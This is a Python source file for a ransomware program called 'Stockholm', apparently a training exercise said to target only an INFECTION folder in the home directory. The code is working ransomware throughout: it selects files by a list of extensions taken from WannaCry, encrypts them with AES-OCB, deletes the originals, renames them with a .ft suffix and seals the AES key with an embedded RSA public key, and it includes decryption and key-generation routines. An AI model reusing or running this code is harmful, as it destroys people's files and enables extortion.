import utils
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes

class Stockholm:
	pub_key = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCljHKZhJcMzJQSsfQvuDmF0ewr
f8oF3F2Pd5QSNulv8oyJtfUKMD4O4xVjbZKPnU1SxQ3EB7F1JgzB7h+PiIlwDLbo
/sKQ6FouX/UwjqXh9drBxCqhDQvn2BSuj3dgnctiw1NJNPvRl45stdkHVhvMVh7f
GU9ACfOMVgzdb6v0RQIDAQAB
-----END PUBLIC KEY-----"""

	usage = "Usage: ./stockholm [options] KEY\n \
	options:\n\
		- -h, -help : display the help\n \
		- -v, -version: Display program's version\n \
		- -r, -reverse: reverse the infection using the given key\n \
		- -s, -silent: Do not display the encrypted files\n\
		- **-k, -key**: Given the private key as argument, it decrypt the key to use for reverse.\n\
 		  Without argument, it generate the private and public key:\n\
 			=> The private key is to save and be kept secret.\n\
 			=> The public key is to put inside the class variable pub_key, in stockolm.py."

	wannacry = [".doc", ".docx", ".xls", ".xlsx", ".ppt", 
		".pptx", ".odt", ".ods", ".odp", ".rtf", ".txt", ".csv",
		".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tif", ".raw",
		".psd", ".mp3", ".mp4", ".avi", ".mkv", ".zip", ".rar",
		".7z", ".tar", ".gz", ".bak", ".sql", ".db", ".mdb", ".cpp", ".c",
		".h", ".java", ".py", ".php", ".js", ".pdf", ".xml", ".json"]

	@classmethod
	def help(cls):
		print(cls.usage)
		print("Ransomware that only affects files whose extensions have been affected by WANNACRY, inside a folder named INFECTION inside HOME directory.\n")
		print(" * The key given to encrypt must be at least 16 characters long\n")
		print(" * All the affected files while are renamed  with a .ft extension\n")

	def generate_key():
		key = RSA.generate(1024)
		private_key = key.export_key()
		public_key = key.publickey().export_key()

		print(f"Private key (save it and keep it safe):\n  {private_key.decode()}\n")
		print(f"Public key (to be put in the Stockholm class variable sub_key):\n  {public_key.decode()}")

	def version():
		print("v1.0.0")

	def __init__(self, args):
		self.options = ""
		self.key = ""
		self.display = True

		i = 0
		while i < len(args):
			if args[i] == "-r" or args[i] == "-reverse":
				self.options += "r"
			elif args[i] == "-h" or args[i] == "-help":
				self.options += "h"
			elif args[i] == "-v" or args[i] == "-version":
				self.options += "v"
			elif args[i] == "-s" or args[i] == "-silent":
				self.display = False
			elif args[i] == "-k" or args[i] == "-key":
				self.options += "k"
			else:
				if i < len(args) - 1:
					raise ValueError(f"Invalid option: {args[i]}")
				if len(args[i]) < 16:
					raise ValueError("Encryptiion key must be at least 16 characters long")
				self.key = args[i]
			i += 1

	def encrypt(self):
		file_list = utils.get_file_list()
		file_list = [file for file in file_list if os.path.splitext(file)[1] in Stockholm.wannacry]

		if not file_list:
			print("Nothing to do here ...")
			return

		# Generate encryption key
		self.key = get_random_bytes(16)

		self.display and print(f"Encrypted: \n")
		for file in file_list:
			cipher = AES.new(self.key, AES.MODE_OCB)
			with open(file, "rb") as original:
				data = original.read()
			ciphertext, tag = cipher.encrypt_and_digest(data)
			assert len(cipher.nonce) == 15
			with open(file + ".ft", "wb") as crypted:
				crypted.write(tag)
				crypted.write(cipher.nonce)
				crypted.write(ciphertext)
			self.display and print(f"  * {file}")
			os.remove(file)
		self.encrypt_key()

	def decrypt(self):
		file_list = utils.get_file_list()
		file_list = [file for file in file_list if os.path.splitext(file)[1] == ".ft"] 
		
		if not file_list:
			print("Nothing to do here ...")
			return

		aes_key = bytes.fromhex(self.key)
		cipher = AES.new(aes_key, AES.MODE_OCB)

		self.display and print(f"Decrypted: \n")
		for file in file_list:
			with open(file, "rb") as crypted:
				tag = crypted.read(16)
				nonce = crypted.read(15)
				data = crypted.read()
			cipher = AES.new(aes_key, AES.MODE_OCB, nonce=nonce)
			plaintext = cipher.decrypt_and_verify(data, tag)
			with open(file[:-3], "wb") as original:
				original.write(plaintext)
			self.display and print(f"  * {file[:-3]}")
			os.remove(file)

	def encrypt_key(self):
		pu_key = RSA.import_key(self.pub_key)
		cipher_rsa = PKCS1_OAEP.new(pu_key)
		enc_key = cipher_rsa.encrypt(self.key)

		with open(".enc_key", "wb") as file:
			file.write(enc_key)

	def decrypt_key(self):
		pr_key = RSA.import_key(self.key.encode())
		cipher_rsa = PKCS1_OAEP.new(pr_key)

		with open(".enc_key", "rb") as file:
			enc_key = file.read()
		dec_key = cipher_rsa.decrypt(enc_key)
		print(f"To reverse, use:\n  {dec_key.hex()}")

	def print(self):
		print(f"Options: ")
		for o in self.options:
			print(f"  - {o}")
		print(f"Key: {self.key}")